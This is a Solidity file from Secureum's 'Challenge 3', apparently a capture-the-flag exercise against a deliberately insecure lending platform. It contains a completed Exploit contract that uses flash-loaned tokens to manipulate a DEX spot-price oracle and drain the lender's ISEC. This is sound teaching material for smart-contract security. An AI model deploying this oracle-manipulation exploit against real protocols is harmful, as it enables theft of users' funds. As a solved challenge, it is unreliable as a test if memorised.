// SPDX-License-Identifier: MIT

/*

Welcome to Challenge 3!

This file contains the challege's Exploit contract which you will have to complete.

=====================================================================

Finally, as a conclusion to this not-so-secure ecosystem,
the Secureum team built the `BorrowSystemInsecureOracle` lending platform
where one can borrow and loan $ISEC and `BoringToken` ($BOR).
Both tokens can be borrowed by either providing themselves or the other token
as collateral.

ðŸ“Œ Upon deployment, the `InSecureumToken` and `BoringToken` contracts mint an
initial supply of 30000 $ISEC and 20000 $BOR to the contract deployer.

ðŸ“Œ `BorrowSystemInsecureOracle` uses the `InsecureDexLP` to compute the
$ISEC/$BOR price.

ðŸ“Œ The deployer adds an initial liquidity of 100 $ISEC and 100 $BOR
to the `InsecureDexLP`.

ðŸ“Œ Similarly, `InSecureumLenderPool` contract is funded with
10000 $ISEC by the deployer.

ðŸ“Œ The `BorrowSystemInsecureOracle` contract has an initial amount of
10000 $ISEC and 10000 $BOR provided by the deployer.

ðŸ“Œ Users can add collateral and take loans from `BorrowSystemInsecureOracle`.

ðŸ“Œ Users may also get liquidated.

Will you be able to **drain** all the $ISEC from
`BorrowSystemInsecureOracle`? ðŸ˜ˆðŸ˜ˆðŸ˜ˆ
*/

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                           DEPENDENCIES                          //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * To solve this challenge, you will need some interfaces.
 * We kindly provide them below :)
 */
pragma solidity 0.8.14;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface BorrowSystemInsecureOracle {
    function depositToken1(uint256 amount) external;
    function borrowToken0(uint256 amount) external;
}

interface InsecureDexLP {
    function addLiquidity(uint256 amount0, uint256 amount1) external;
    function balanceOf(address user) external view returns(uint256);
    function removeLiquidity(
        uint256 amount
    ) external returns(uint amount0, uint amount1);
    function swap(
        address tokenFrom,
        address tokenTo,
        uint256 amountIn
    ) external returns(uint256 amountOut);
    function token0() external returns(IERC20);
    function token1() external returns(IERC20);
}   

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                         EXPLOIT CONTRACT                        //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * Complete the contract below so that you steal all the $ISECs?
 * Note that you can also modify the `Deploy Exploit Contracts` section
 * of `script.js` as needed by your Exploit implementation.
 *
 * Note: we already completed a tiny part of the contract for you! :)
 * Note2: you may also declare additional contracts... ;)
 */

contract Exploit {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;

    address player;

    constructor(address _token0, address _token1, address _borrowSystem, address _dex, address _player) {
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
        
        dex = InsecureDexLP(_dex);

        token0.approve(_borrowSystem, type(uint256).max);
        token1.approve(_borrowSystem, type(uint256).max);

        token0.approve(_dex, type(uint256).max);
        token1.approve(_dex, type(uint256).max);

        player = _player;
    }

    function hack() external {
        address flashLoan = msg.sender;
        uint256 _balance = token0.balanceOf(address(this));

        uint256 _amountToken1 = dex.swap(address(token0), address(token1), 8000 ether);

        
        borrowSystem.depositToken1(_amountToken1);
        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
                                    
        token0.transfer(flashLoan, _balance);

        token0.transfer(player, token0.balanceOf(address(this)));
    }
}

contract ExploitReceiver {
    function troll(address exploit, address token) external {
        IERC20(token).transfer(exploit, IERC20(token).balanceOf(address(this)));
        
        Exploit(exploit).hack();
    }
}